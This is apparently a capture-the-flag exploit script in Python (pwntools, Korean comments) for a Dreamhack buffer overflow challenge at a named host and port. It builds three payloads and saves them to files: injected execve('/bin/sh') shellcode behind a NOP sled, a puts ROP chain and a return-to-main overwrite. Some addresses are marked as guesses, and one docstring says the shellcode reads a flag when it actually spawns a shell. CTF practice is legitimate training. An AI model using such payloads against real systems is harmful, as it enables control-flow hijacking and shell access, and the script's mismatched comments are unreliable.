#!/usr/bin/env python3
"""
Awesome-basics Buffer Overflow Exploit
3가지 공격 방법을 준비
"""

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 16332

def create_payload_method1():
    """
    Method 1: Shellcode Injection
    - 스택 실행 가능하므로 직접 셸코드 실행
    - /tmp/flag 파일을 읽어서 출력
    """
    print("[+] Method 1: Shellcode to read /tmp/flag")
    
    # 간단한 shellcode: execve("/bin/sh", NULL, NULL)
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    
    # NOP sled
    nop_sled = b"\x90" * 40
    
    # 페이로드 구성
    payload = nop_sled + shellcode
    padding = 88 - len(payload)
    if padding > 0:
        payload += b"A" * padding
    
    # 스택 주소 (NOP sled 시작점)
    stack_addr = p64(0x7fffffffe000)
    payload += stack_addr
    
    print(f"   Shellcode size: {len(shellcode)}")
    print(f"   Total payload: {len(payload)} bytes")
    
    return payload

def create_payload_method2():
    """
    Method 2: ROP Chain with puts
    - puts 함수를 이용해 flag 내용 출력
    - BSS 섹션의 flag 포인터를 읽어서 출력
    """
    print("[+] Method 2: ROP chain with puts")
    
    # 주소들 (추정값)
    puts_plt = 0x401030       # puts@plt
    pop_rdi_ret = 0x4012c3    # pop rdi; ret gadget
    flag_ptr_addr = 0x404020  # BSS의 flag 포인터 위치 (추정)
    
    # 88바이트 패딩
    payload = b"A" * 88
    
    # ROP chain: puts(*flag_ptr)
    # 하지만 이건 flag 포인터 자체를 출력함
    # 실제로는 flag가 가리키는 내용을 출력해야 함
    
    payload += p64(pop_rdi_ret)    # pop rdi; ret
    payload += p64(flag_ptr_addr)  # rdi = &flag
    payload += p64(puts_plt)       # call puts
    
    print(f"   Using puts@plt: 0x{puts_plt:x}")
    print(f"   Using pop_rdi: 0x{pop_rdi_ret:x}")
    print(f"   Flag pointer: 0x{flag_ptr_addr:x}")
    print(f"   Total payload: {len(payload)} bytes")
    
    return payload

def create_payload_method3():
    """
    Method 3: Return to main + shellcode
    - main으로 돌아가서 두 번째 입력 기회 생성
    - 두 번째에는 더 정교한 공격 수행
    """
    print("[+] Method 3: Return to main")
    
    main_addr = 0x401196  # main 함수 주소 (추정)
    
    payload = b"A" * 88
    payload += p64(main_addr)  # return to main
    
    print(f"   Main address: 0x{main_addr:x}")
    print(f"   Total payload: {len(payload)} bytes")
    
    return payload

def test_payloads():
    """실제 서버 연결 전에 페이로드들을 준비"""
    
    print("=== Exploit Payload Generation ===")
    print()
    
    # 3가지 방법의 페이로드 생성
    method1 = create_payload_method1()
    print()
    method2 = create_payload_method2()  
    print()
    method3 = create_payload_method3()
    print()
    
    print("=== Ready for Server Connection ===")
    print("Payloads prepared. Use one at a time with 30-second timeout.")
    
    return {
        'shellcode': method1,
        'rop_puts': method2,
        'ret2main': method3
    }

if __name__ == "__main__":
    payloads = test_payloads()
    
    # 페이로드를 파일로 저장 (나중에 쉽게 사용)
    with open('payload_shellcode.bin', 'wb') as f:
        f.write(payloads['shellcode'])
    
    with open('payload_rop.bin', 'wb') as f:
        f.write(payloads['rop_puts'])
        
    with open('payload_ret2main.bin', 'wb') as f:
        f.write(payloads['ret2main'])
    
    print("\n[+] Payloads saved to files:")
    print("    - payload_shellcode.bin")
    print("    - payload_rop.bin") 
    print("    - payload_ret2main.bin")
